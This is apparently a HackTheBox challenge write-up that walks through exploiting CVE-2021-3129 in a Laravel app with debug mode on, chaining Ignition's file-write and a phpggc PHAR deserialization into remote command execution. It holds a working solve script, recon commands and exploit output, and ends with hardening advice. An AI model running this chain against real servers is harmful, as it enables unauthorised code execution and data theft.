---
layout: post
title: "Userland City"
date: 2027-12-31 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, laravel, ignition, phar-deserialization, rce, cve-2021-3129, cwe-502]
---

A darknet-market web app built on Laravel with debug mode left on. The Ignition error handler exposes an unauthenticated file-write plus a deserialization trigger — the classic [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) chain. Bake a `phpggc` gadget into a PHAR, poison the Laravel log so it *becomes* that PHAR, force a `phar://` deserialize, and the command output lands right back in the debug error page.

## Overview

Userland City hands you vendor credentials and hints at an image-metadata angle, but both are misdirection. The description quietly admits the real bug: *"the marketplace is built on top of the latest Laravel version and debug mode is enabled."* That single fact is the entire challenge — Laravel with `APP_DEBUG=true` and Ignition `<= 2.5.1` is a one-shot remote code execution.

## The technique

When `APP_DEBUG=true`, Laravel mounts the **Facade Ignition** error handler, which registers the endpoint `/_ignition/execute-solution`. Two of its "solutions" are dangerous when reachable without authentication:

- **A file-write primitive** — `MakeViewVariableOptionalSolution` lets an attacker control a file's contents. Point it at `storage/logs/laravel.log`, truncate it, and rewrite it so the bytes form a valid **PHAR** archive whose serialized metadata is a POP gadget chain.
- **A deserialization trigger** — forcing a view include over a `phar://` path deserializes that metadata, and the gadget's destructor runs `system($cmd)`.

`phpggc`'s `monolog/rce1` chain is what turns "deserialize a PHAR" into "run a shell command", making this a textbook [PHAR deserialization](https://cwe.mitre.org/data/definitions/502.html) RCE. The rendered debug error page then echoes the command's stdout, so there's no need for a callback or reverse shell.

## Solution

First confirm the target is Laravel with Ignition exposed:

```bash
curl -sI http://<host>:<port>/          # Set-Cookie: laravel_session=...  → Laravel
curl -s -o /dev/null -w '%{http_code}\n' http://<host>:<port>/_ignition/health-check   # 200 → Ignition live
```

Then run the two-step exploit (tools: [`phpggc`](https://github.com/ambionics/phpggc) and [`laravel-exploits`](https://github.com/ambionics/laravel-exploits)). The `solve.py` below is just a thin wrapper around them:

```python
#!/usr/bin/env python3
import subprocess, sys, re, pathlib

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
TOOLS = pathlib.Path.home() / "Downloads/Tools"
PHPGGC = TOOLS / "phpggc/phpggc"
EXPLOIT = TOOLS / "laravel-exploits/laravel-ignition-rce.py"
PHAR = pathlib.Path(__file__).with_name("exploit.phar")

subprocess.run([
    "php", "-d", "phar.readonly=0", str(PHPGGC),
    "--phar", "phar", "-f", "-o", str(PHAR), "--fast-destruct",
    "monolog/rce1", "system", "cat /flag*"
], check=True)

out = subprocess.run(["python3", str(EXPLOIT), TARGET, str(PHAR)],
                     capture_output=True, text=True).stdout
print(out)
m = re.search(r"HTB\{[^}]+\}", out)
print("FLAG:", m.group(0) if m else "not found")
```

Run it:

```bash
python3 solve.py http://<host>:<port>
```

```
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
HTB{...}
```

Note the `cat /flag*` glob — the flag file name is randomized per instance (`/flag8CF5o` on this run), so a fixed path won't work.

## Why it worked

Debug mode was never meant to reach production. The Ignition handler exposes both an unauthenticated file-write primitive and a deserialization trigger, and chaining them yields RCE without a single credential. The vendor login and the exiftool/image angle in the prompt exist only to burn your time. Unlike the classic HTB-box variant where Laravel binds to localhost and you tunnel in with `ssh -L`, here Ignition is directly internet-facing, so the exploit fires straight at the public port.

## Fix / defense

- **Never ship `APP_DEBUG=true` to production** — it exposes the Ignition RCE surface and leaks environment/config on every error.
- Upgrade `facade/ignition` past 2.5.1; the patched releases validate the solution parameters.
- Harden PHP: set `phar.readonly=1`, disable the `phar://` stream wrapper where it isn't needed, and keep detailed error output off in prod.
- Gate any developer/debug tooling behind authentication, or strip it from the production build entirely.
